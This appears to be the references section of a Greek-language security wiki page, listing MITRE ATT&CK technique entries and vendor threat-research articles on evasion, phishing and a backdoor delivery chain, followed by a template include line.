- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Το Microsoft Management Console για αρχική πρόσβαση και αποφυγή εντοπισμού](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Οι παράγοντες απειλής εκμεταλλεύονται τη φορολογική περίοδο για να εξαπολύσουν εκστρατείες phishing με φορολογικό θέμα](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – Αλυσίδα παράδοσης UAT-11587 και backdoor Antino](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
{{#include ../../banners/hacktricks-training.md}}
